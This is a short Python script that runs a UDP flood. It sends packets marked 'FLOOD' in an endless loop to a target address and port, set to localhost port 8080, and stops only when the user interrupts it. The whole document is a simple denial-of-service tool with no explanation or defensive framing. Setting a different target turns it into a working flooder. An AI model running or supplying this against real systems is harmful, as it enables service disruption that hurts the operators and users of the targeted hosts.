import socket
import time

target_ip = "127.0.0.1"  
target_port = 8080       

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"FLOOD", (target_ip, target_port))
        print("Packet sent!", end="\r")
    except KeyboardInterrupt:
        print("\nStopped.")
        break

